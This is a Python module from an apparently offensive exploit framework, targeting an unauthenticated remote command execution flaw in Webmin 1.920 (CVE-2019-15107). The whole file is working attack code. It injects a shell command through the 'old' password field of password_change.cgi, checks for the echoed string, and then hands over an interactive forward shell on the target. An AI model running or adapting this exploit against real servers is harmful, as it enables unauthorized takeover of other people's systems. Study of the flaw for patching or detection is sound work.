from zerooosploit.exploits import ExploitAggregate
from zerooosploit.httpclient import HttpClient
from zerooosploit.printer import *
from zerooosploit.shell import TakeControl


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Webmin 1.920 Unauthenticated RCE',
            'Module': 'exploits/webmin/cve-2019-15107',
            'Product': 'webmin',
            'Cve': 'CVE-2019-15107',
            'Create_date': '2019-12-21',
            'Description': '',
            'Authors': '01sec',
            'References': 'https://www.exploit-db.com/exploits/47230'
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:10000/', 'Required': 'yes', 'Description': 'The target url'},
        }

    def exploit(self):
        url = self.get_options('url')
        vul_url = url + 'password_change.cgi'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0', 'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1', 'Referer': '{}'.format(url + '/session_login.cgi')}
        randomstr = self.randomstr()
        check_payload = {'user': 'rootxx', 'pam': '', 'expired': '2', 'old': 'test|echo {}'.format(randomstr), 'new1': 'test2', 'new2': 'test2'}
        res = HttpClient().send_request_cgi(method='POST', url=vul_url, headers=headers, data=check_payload)
        if res is not None:
            if randomstr in res.text:
                print_green('[+] Exploit succeed')
                vul_param = 'echo {}'.format(randomstr)
                TakeControl(res).forward_shell(vul_param)
            else:
                print_red('[-] {0} {1}'.format(vul_url, res.status_code))
                print_white(res.text)

        print_blue('[*] Exploit completed')

